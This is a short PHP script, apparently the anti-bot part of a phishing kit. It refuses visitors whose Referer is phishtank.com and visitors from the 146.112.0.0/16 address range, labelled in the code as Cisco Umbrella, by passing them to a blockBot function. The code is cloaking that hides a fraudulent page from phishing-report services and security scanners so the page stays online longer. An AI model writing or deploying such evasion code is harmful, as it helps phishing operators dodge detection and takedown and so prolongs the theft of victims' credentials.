<?php
	// 1. Referer Block (phishtank)
	### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###
	if (isset($_SERVER['HTTP_REFERER'])) {
		$refererHost = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
		$blockedHosts = ['phishtank.com', 'www.phishtank.com'];
		if (in_array($refererHost, $blockedHosts)) {
			blockBot($_SERVER['HTTP_USER_AGENT'], 'Phishtank');
		}
	}

	// 2. IP Blacklist Check (Cisco Umbrella range)
	### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ipLong      = ip2long($_SERVER['REMOTE_ADDR']);

	if ($ipLong !== false && $ipLong >= $range_start && $ipLong <= $range_end) {
		blockBot($_SERVER['HTTP_USER_AGENT'], 'Blacklist');
	}
?>